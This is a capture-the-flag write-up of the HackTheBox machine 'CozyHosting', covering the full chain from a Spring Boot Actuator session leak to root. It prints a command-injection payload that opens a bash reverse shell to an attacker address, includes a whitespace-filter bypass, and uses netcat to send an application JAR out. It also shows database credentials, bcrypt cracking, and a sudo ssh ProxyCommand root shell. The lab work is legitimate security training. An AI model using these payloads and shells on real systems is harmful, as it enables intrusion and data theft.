---
title: "CozyHosting"
date: 2024-01-22
categories: [HackTheBox, Easy]
tags: [linux, spring-boot, command injection, postgresql, john the ripper]
image:
  path: /assets/img/HTB/CozyHosting/banner.png
  alt: CozyHosting writeup
---


Spring Boot application leaking session IDs through an exposed `/actuator/sessions` endpoint, allowing direct hijack of an admin's JSESSIONID. The admin panel exposes a `/executessh` endpoint vulnerable to command injection via the `username` field, bypassed with `${IFS%??}` to defeat the space filter and yielding a reverse shell as `app`. Lateral movement to `josh` via PostgreSQL credentials extracted from a decompiled JAR and bcrypt cracking of the admin password (reused across application and system accounts); privilege escalation via a GTFOBins-style abuse of `sudo /usr/bin/ssh *`.

| Field      | Details             |
|------------|---------------------|
| Platform   | HackTheBox          |
| Difficulty | Easy                |
| OS         | Linux               |
| IP         | 10.10.11.230        |
| Date       | January 2024        |

## Tools Used

| Tool              | Description                                                                          |
|-------------------|--------------------------------------------------------------------------------------|
| nmap              | Network port scanner and service fingerprinter                                       |
| whatweb           | Web technology fingerprinting tool                                                   |
| gobuster          | Directory and file enumeration via wordlist brute-forcing                            |
| Browser DevTools  | Session cookie injection through the Storage panel for the hijack step               |
| Burp Suite        | Request interception and modification of the `/executessh` payload                   |
| netcat (nc)       | Reverse-shell listener and JAR file transfer                                         |
| jd-gui            | Java decompiler used to inspect `cloudhosting-0.0.1.jar`                             |
| psql              | PostgreSQL client used to dump the `users` table                                     |
| hashid            | Hash algorithm identifier                                                            |
| john              | Password cracker, used against the bcrypt hash of the `admin` account                |

## Reconnaissance & Enumeration

The objective of this phase was to enumerate exposed services and identify the application stack worth attacking.

### Host Discovery

Reachability was confirmed with ICMP. The TTL of 63 (default Linux TTL is 64, decremented once across the routing hop) gave the usual OS hint:

```bash
ping -c 1 10.10.11.230
PING 10.10.11.230 (10.10.11.230) 56(84) bytes of data.
64 bytes from 10.10.11.230: icmp_seq=1 ttl=63 time=1082 ms
```

### Port Scan

A SYN scan across the full TCP range at a high packet rate, with `-Pn` skipping host discovery and `-n` disabling reverse DNS:

```bash
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.11.230 -oG AllPorts
Host: 10.10.11.230 ()   Status: Up
Host: 10.10.11.230 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 9000/open/tcp//cslistener///
```

Three ports came back open: SSH, HTTP, and a third service Nmap labelled `cslistener` on 9000. A targeted scan with default scripts and version detection followed:

```bash
nmap -p22,80,9000 -sCV 10.10.11.230 -oN nmap
PORT     STATE  SERVICE     VERSION
22/tcp   open   ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
80/tcp   open   http        nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
9000/tcp closed cslistener
```

A few observations were relevant. **OpenSSH 8.9p1 on Ubuntu** is recent and unlikely to be a direct entry point. Port 9000 turned out to be closed on the second scan (probably transient or rate-limited during the first), so the only real attack surface was HTTP on 80. The page title `Cozy Hosting - Home` and the redirect that nginx returned both pointed at a name-based virtual host.

### Technology Fingerprinting

`whatweb` confirmed both the redirect target and the underlying stack:

```bash
whatweb 10.10.11.230
http://10.10.11.230 [301 Moved Permanently] HTTPServer[nginx/1.18.0 (Ubuntu)], RedirectLocation[http://cozyhosting.htb], Title[301 Moved Permanently]
http://cozyhosting.htb [200 OK] Bootstrap, HTTPServer[nginx/1.18.0 (Ubuntu)], Email[info@cozyhosting.htb], HTML5, Title[Cozy Hosting - Home]
```

The domain `cozyhosting.htb` was added to `/etc/hosts` so the application would resolve correctly:

```bash
echo "10.10.11.230 cozyhosting.htb" | sudo tee -a /etc/hosts
```

### Directory Enumeration

The home, services, and pricing pages had no obvious entry points — no version banners, no login (yet), no parameters worth fuzzing. The natural next step was content discovery:

```bash
gobuster dir -u http://cozyhosting.htb/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/admin                (Status: 401) [Size: 97]
/logout               (Status: 204) [Size: 0]
/error                (Status: 500) [Size: 73]
```

Three things stood out. The `/admin` endpoint exists but returns 401, meaning there's a real authentication boundary worth bypassing. The `/error` endpoint returns 500, which is unusual — most apps return a generic error page or redirect. And visiting `/error` directly revealed the smoking gun:

> **Whitelabel Error Page**
> This application has no explicit mapping for /error, so you are seeing this as a fallback.
> There was an unexpected error (type=None, status=999).

The "Whitelabel Error Page" string is the default error template for **Spring Boot** applications. Identifying the framework matters because Spring Boot ships with a notoriously over-exposed management module called **Actuator**.

## Exploitation

### Spring Boot Actuator Discovery

Spring Boot's Actuator is a management subsystem that exposes runtime metrics, configuration, environment variables, and — depending on how aggressively it's been configured — session information, heap dumps, environment variables containing credentials, and even arbitrary endpoint execution. In secure deployments Actuator is either disabled, mounted on a separate management port, or restricted to localhost. In insecure deployments — like this one — it's mounted under `/actuator` on the public application and lists every available sub-endpoint when queried at the root.

Hitting `/actuator` directly returned the endpoint catalogue:

```bash
curl -s http://cozyhosting.htb/actuator | jq .
{
  "_links": {
    "self":     { "href": "http://cozyhosting.htb/actuator", "templated": false },
    "sessions": { "href": "http://cozyhosting.htb/actuator/sessions", "templated": false },
    "health":   { "href": "http://cozyhosting.htb/actuator/health", "templated": false },
    "mappings": { "href": "http://cozyhosting.htb/actuator/mappings", "templated": false },
    "env":      { "href": "http://cozyhosting.htb/actuator/env", "templated": false }
  }
}
```

The `/actuator/sessions` endpoint is the interesting one — it returns active server-side session IDs.

### Session Hijacking via `/actuator/sessions`

Browsing to `http://cozyhosting.htb/actuator/sessions` returned a JSON object mapping session IDs to the usernames they belonged to:

```bash
curl -s http://cozyhosting.htb/actuator/sessions | jq .
{
  "4CCF7360B29B2E07EE2D1864E1D7E45F": "UNAUTHORIZED",
  "1F3A1D95A360C066C6C075AC1F8F7AFE": "kanderson"
}
```

This is a complete authentication bypass. The session for **`kanderson`** is bound to JSESSIONID `1F3A1D95A360C066C6C075AC1F8F7AFE`, and Spring Boot's session cookie defaults make that ID alone sufficient to authenticate. Anyone who can read `/actuator/sessions` can read every active user's session ID, which means they can be every active user.

I opened DevTools on the `cozyhosting.htb` login page, navigated to **Storage → Cookies**, and pasted the hijacked JSESSIONID as the value of the `JSESSIONID` cookie. Reloading the page redirected directly into `/admin` — authenticated as kanderson, no password required.

### Command Injection in `/executessh`

The admin dashboard exposed an "Add Host" form for managing SSH connections to the company's hosting infrastructure. The form posted to `/executessh` with two fields, `host` and `username`. Capturing the request in Burp Suite revealed the exact request shape:

```http
POST /executessh HTTP/1.1
Host: cozyhosting.htb
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=1F3A1D95A360C066C6C075AC1F8F7AFE

host=10.10.11.230&username=test
```

A submission with arbitrary values returned `Host Key Verification Failed`, which is *exactly* the error message that **the real `ssh` binary** produces when it cannot validate a host key. That single error message gave the architecture away: the backend was invoking `ssh user@host` as an external process with the form fields interpolated into the command line. Any code path that builds a shell command from user input is a prime suspect for command injection.

Probing with a single-quote in `username` triggered a different error — a shell parsing error reflected back in the response — confirming that the input reaches a shell context. The next test used a semicolon and a `whoami` to break out of the intended `ssh` argument:

```text
host=10.10.11.230&username=test;whoami
```

The response now contained `whoami@10.10.11.230` instead of `test@10.10.11.230`, meaning the literal command name was being substituted in. The injection worked at the shell level, but the shell needed the command to actually execute. Wrapping it in backticks forced execution:

```text
host=10.10.11.230&username=test;`whoami`
```

The response confirmed the executed username: **`app`**.

### Bypassing the Space Filter with `${IFS%??}`

A more useful test — reading `/etc/passwd` — failed because the application validates `username` against whitespace:

```text
Username can't contain whitespaces!
```

This is a textbook command-injection filter: the developer blocked **space characters** in `username` to "prevent injection", but every realistic injection payload (`cat /etc/passwd`, base64-piped reverse shells, etc.) needs spaces between arguments. The classic bypass is to use a shell-side substitution that *evaluates to* a space without containing one in the literal input.

The `$IFS` variable in Bash is the **Internal Field Separator** — the set of characters Bash uses to split words. Its default value is `' \t\n'` (space, tab, newline). Any expansion of `$IFS` in a shell context produces a whitespace character that the application's filter never sees as a literal space, because the literal payload contains only the four characters `$`, `{`, `I`, `F`, `S`, `}`.

Two variants are commonly used:

- **`$IFS`** alone — works in most contexts, but expands to all three IFS characters at once, which can introduce stray tabs/newlines that confuse downstream parsers.
- **`${IFS%??}`** — uses Bash's parameter expansion `${var%pattern}` (remove shortest matching suffix) with `??` matching two characters. The trailing tab and newline are stripped, leaving only the space. This is the safer variant when the shell context is brittle.

The reverse-shell payload was prepared as a one-liner, base64-encoded to avoid even more filter issues:

```bash
echo "bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDUvNDQzIDA+JjEK
```

Wrapped in a `echo ... | base64 -d | bash` chain with every space replaced by `${IFS%??}`:

```text
;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMDUvNDQzIDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

And finally URL-encoded for transport in the POST body (`+` becomes `%2B`, `;` becomes `%3B`, `$` becomes `%24`, etc.) to prevent the HTTP layer from misinterpreting any reserved character:

```text
username=%3Becho%24%7BIFS%25%3F%3F%7D%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xMDUvNDQzIDA%2BJjEK%22%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbase64%24%7BIFS%25%3F%3F%7D-d%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbash%3B
```

A netcat listener was started on the attacker box:

```bash
nc -nlvp 443
Listening on 0.0.0.0 443
```

The final request was forwarded through Burp. The listener caught the callback as the **`app`** service user. A standard TTY upgrade (`script /dev/null -c bash` → `Ctrl+Z` → `stty raw -echo; fg` → `reset`) made the shell usable.

## Lateral Movement — `app` → `josh`

### Locating the Application JAR

A shell as the `app` service user has very little reach by default. The first useful artefact was visible immediately in `/app`:

```bash
ls /app
cloudhosting-0.0.1.jar
```

A Spring Boot fat JAR contains every dependency, every configuration file, every compiled class — including hardcoded credentials and database connection strings. Extracting and reading it is the standard next move.

### Exfiltrating the JAR

Netcat handles binary transfers cleanly. A listener with redirection on the attacker side captures the file as it streams in:

```bash
# Attacker:
nc -nlvp 443 > db.jar
```

```bash
# Target:
nc <ATTACKER_IP> 443 < cloudhosting-0.0.1.jar
```

### Decompiling with jd-gui

`jd-gui` is a GUI Java decompiler that opens fat JARs directly and presents their class tree with decompiled source on the right pane:

```bash
jd-gui db.jar
```

Two files mattered.

**`BOOT-INF/classes/application.properties`** held the Spring datasource configuration, including the PostgreSQL credentials:

```properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled=true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.datasource.jpa.database-platform=org.hibernate.dialect.PostgreSQL
spring.jpa.hibernate.ddl-auto=none
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Two side-observations worth noting beyond the obvious credential disclosure: the `management.endpoints.web.exposure.include` line explicitly enabled the `sessions` endpoint that broke the authentication earlier, and `server.address=127.0.0.1` means the Spring Boot app only listens on localhost — there's an nginx reverse proxy in front of it on port 80 that adds the public-facing layer.

**`BOOT-INF/classes/htb/cloudhosting/scheduled/FakeUser.class`** decompiled to a class containing what looked like another credential:

```text
"--data-raw", "username=kanderson&password=MRdEQuv6~6P9", "-v"
```

The class name `FakeUser` is the giveaway — this is a deliberate red herring planted to waste an attacker's time. The credential `MRdEQuv6~6P9` does not work against any actual service. The real path leads through PostgreSQL.

### PostgreSQL Dump

The shell on the target had `psql` available, so the database could be queried directly without needing a tunnel:

```bash
psql -h 127.0.0.1 -U postgres
Password for user postgres: Vg&nvzAQ7XxR

postgres=# \c cozyhosting
You are now connected to database "cozyhosting" as user "postgres".

cozyhosting=# \d
                List of relations
 Schema |     Name     |   Type   |  Owner
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres

cozyhosting=# SELECT * FROM users;
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecfImPudWeLSEIv.cvK6QjxjWlWXpj1NVNV3Mm6eH58zim   | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm  | Admin
```

Two bcrypt hashes, one per user. The `admin` hash is the one worth attacking — it's the privileged account and more likely to have a guessable password reused elsewhere.

### Cracking the bcrypt Hash

Confirming the algorithm with `hashid` before throwing wordlists at it saved time and ensured the right hashcat/john mode:

```bash
hashid '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
Analyzing '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
[+] Blowfish(OpenBSD)
[+] Woltlab Burning Board 4.x
[+] bcrypt
```

bcrypt with a cost of 10 — slow by design, so a targeted wordlist matters more than raw speed. `john` against `rockyou.txt`:

```bash
john -w:/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
manchesterunited (?)
1g 0:00:00:14 DONE
```

Recovered password: **`manchesterunited`** — a popular football club, exactly the kind of low-effort password rockyou is built to catch.

### Credential Reuse: `admin` → `josh`

The cracked password belonged to the application's `admin` user, which has no inherent OS presence — `admin` is a row in a database table, not an entry in `/etc/passwd`. The interesting question was whether the same password had been reused for a system account. Reading `/etc/passwd` from the target shell revealed exactly one user with a real login shell besides `root`:

```bash
cat /etc/passwd | grep -E "/bin/(bash|sh)$"
root:x:0:0:root:/root:/bin/bash
josh:x:1003:1003::/home/josh:/bin/bash
```

Trying `manchesterunited` against `josh` worked:

```bash
su josh
Password: manchesterunited
josh@cozyhosting:~$ whoami
josh
josh@cozyhosting:~$ cat user.txt
```

This is the canonical credential-reuse pattern: an application-level password that the same operator happened to set on a system account because remembering two passwords is harder than remembering one.

## Privilege Escalation — `josh` → `root`

With a shell as `josh`, `sudo -l` returned the privilege-escalation vector immediately:

```bash
sudo -l
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=...

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

`josh` can run `/usr/bin/ssh` as root with any arguments (`*` wildcard). At first glance this looks innocuous — `ssh` is for connecting to remote hosts, not for executing local code. But `ssh` has many configuration options that can execute arbitrary commands as side-effects of *trying* to connect, and the most useful one is **`ProxyCommand`**.

`ProxyCommand` tells `ssh` to spawn a local subprocess and use its stdin/stdout as the connection to the target. Because the subprocess is spawned with the same privileges as `ssh` itself — root, in this case — it inherits root's UID. The GTFOBins entry for `ssh` documents the exact incantation: spawn a shell as the ProxyCommand and connect stdin/stdout to the controlling terminal.

```bash
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root
# cat /root/root.txt
```

The leading semicolon turns the option value into a shell command sequence (`;sh 0<&2 1>&2`) that opens `/bin/sh` with stdin/stdout redirected to the inherited TTY (file descriptor 2). The `x` is a dummy target hostname — `ssh` never actually connects, because the proxy command spawns the shell before any networking happens.

The root flag was readable directly from `/root`.

## Flags

| Flag     | Value      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Key Takeaways

- **Spring Boot Actuator is a default attack surface.** Any Spring Boot application reachable on the public internet should be assumed to have an exposed Actuator unless explicitly verified otherwise. The `/actuator/sessions`, `/actuator/env`, `/actuator/heapdump`, and `/actuator/mappings` endpoints alone can hand over authentication, configuration secrets, in-memory credentials, and the full HTTP routing table — without exploiting any code-level vulnerability.
- **Blacklist filters on shell-context input fail predictably.** Blocking literal space characters in a field that ends up in a shell command line is the equivalent of putting a "no fire" sign on dry grass — the attacker just brings a lighter shaped differently. `${IFS%??}`, `$'\x20'`, `${PATH:0:1}`, brace-expansion `{a,b}`, base64 staging, hex-encoded payloads decoded inline — any of these defeats a whitespace blacklist. The correct fix is to never construct shell commands from user input in the first place; if you absolutely must, use `execve`-style APIs that take an argument array and bypass the shell entirely.
- **The shape of an error message tells the architecture.** `Host Key Verification Failed` is not a generic error string — it's the literal output of OpenSSH's `ssh` client. Echoing that string back to the user is enough to reveal that the backend invokes `ssh` as a subprocess, which immediately puts command injection on the test plan.
- **Honeypot credentials are increasingly common in challenge boxes, but the principle applies in real engagements too.** A class literally named `FakeUser` containing what looks like real credentials should be treated with suspicion, not used as a primary lead. The naming itself is a hint, and burning ten minutes on a dead-end credential is the difference between an efficient engagement and a frustrating one.
- **Credential reuse between application and OS layers is the most common lateral-movement primitive in Linux engagements.** Application admin accounts and system accounts owned by the same person almost always share passwords; checking `/etc/passwd` after cracking any application hash should be reflexive, not an afterthought.
- **`sudo /usr/bin/ssh *` is functionally `sudo /bin/bash`.** GTFOBins documents this and many other binaries that, despite appearing "specific-purpose", expose arbitrary code execution through standard configuration options. The general rule is that any binary with a `--exec`, `-c`, `--script`, or `ProxyCommand`-equivalent option should never be allowed via sudo with wildcard arguments.
